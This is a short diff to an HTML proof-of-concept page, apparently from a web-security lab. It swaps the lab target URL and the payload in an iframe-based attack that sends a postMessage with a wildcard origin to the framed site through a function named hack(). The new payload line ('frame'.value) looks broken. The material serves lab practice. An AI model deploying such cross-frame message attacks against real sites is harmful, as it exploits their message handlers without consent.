@@ -4,10 +4,10 @@
     <title>Test</title>
 </head>
 <body>
-    <iframe id="frame" onload="hack()" src="http://ptl-fb0efa5d-e4d10039.libcurl.so/"></iframe>
+    <iframe id="frame" onload="hack()" src="http://ptl-fdd2d5de-c241c114.libcurl.so/"></iframe>
     <script>
         function hack(){
-            setTimeout(function() { document.getElementById("frame").contentWindow.postMessage('user=test&id=0','*');
+            setTimeout(function() { document.getElementById("frame").contentWindow.postMessage('frame'.value,'*');
                                   },2000);
         }
     </script>
